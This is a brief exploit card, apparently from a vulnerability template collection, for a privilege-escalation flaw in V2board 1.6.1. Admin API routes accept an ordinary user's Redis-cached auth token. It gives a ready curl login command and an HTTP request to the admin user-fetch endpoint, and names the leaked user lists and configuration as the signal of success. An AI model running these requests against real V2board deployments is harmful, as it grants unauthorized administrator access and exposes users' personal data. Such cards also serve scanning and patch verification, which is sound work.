# V2board Privilege Escalation (1.6-privilege-escalation)

## 漏洞指纹
- **组件**: V2board
- **版本**: 1.6.1
- **特征**: Redis 会话缓存层未区分管理员与普通用户权限。

## 利用详情
- **Method**: `POST` / `GET`
- **原理**: 普通用户通过合法登录获取的 `auth_data` (存在 Redis 缓存中) 能够直接访问管理员 API 接口，因为系统在权限验证时未校验用户身份所属级别。

## 执行示例
1. 普通用户登录获取 `auth_data`:
```bash
curl -i -s -k -XPOST --data-binary "email=user@example.com&password=password" http://{TARGET}:8080/api/v1/passport/auth/login
```
2. 使用该 Token 直接调用管理员 API:
```http
GET /api/v1/admin/user/fetch HTTP/1.1
Host: {TARGET}:8080
Authorization: {AUTH_DATA_TOKEN}
```

## Success Signal
成功调用管理员 API 并获取敏感数据（如用户列表、配置信息等）。
